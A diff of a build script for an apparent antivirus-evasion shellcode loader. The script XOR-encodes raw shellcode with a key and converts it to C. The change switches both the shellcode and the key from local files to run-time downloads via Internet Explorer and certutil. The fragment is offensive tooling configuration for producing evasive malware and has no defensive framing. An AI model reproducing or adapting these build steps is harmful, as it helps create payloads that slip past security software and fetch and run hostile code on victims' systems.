@@ -39,10 +39,10 @@ encode_shellcode xor input/scraw.txt input/scenc.txt 4 input/keyraw.txt
 # set shellcode source
 # convert from raw to C format using the built-in tool
 ./tools/data_raw_to_c/data_raw_to_c input/scenc.txt input/sc.txt buf
-set_shellcode_source static_from_file input/sc.txt
+set_shellcode_source download_internet_explorer
 
 # set key source
-set_key_source static_from_file input/key.txt
+set_key_source download_certutil
 
 # set decoder
 set_decoder xor
